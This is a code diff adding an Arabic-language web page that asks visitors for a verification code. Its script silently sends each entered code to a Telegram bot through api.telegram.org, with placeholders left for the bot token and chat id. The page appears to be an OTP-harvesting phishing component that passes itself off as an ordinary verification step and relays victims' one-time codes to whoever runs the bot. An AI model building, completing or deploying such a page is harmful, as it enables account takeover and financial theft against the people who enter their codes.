@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>إدخال الرمز</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      text-align: right;
+      background-color: #f9f9f9;
+      padding: 20px;
+    }
+
+    h2 {
+      color: #004c97;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #004c97;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>الرجاء إدخال الرمز</h2>
+
+  <label>رمز التحقق</label>
+  <input type="text" id="code" placeholder="أدخل الرمز هنا">
+
+  <button onclick="sendCode()">إرسال</button>
+
+  <script>
+    const telegramBotToken = 'YOUR_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error("خطأ في إرسال تلغرام", err));
+    }
+
+    function sendCode() {
+      const code = document.getElementById('code').value;
+      const message = `🔐 رمز التحقق المدخل: ${code}`;
+      sendToTelegram(message);
+      alert("تم إرسال الرمز بنجاح!");
+    }
+  </script>
+
+</body>
+</html>
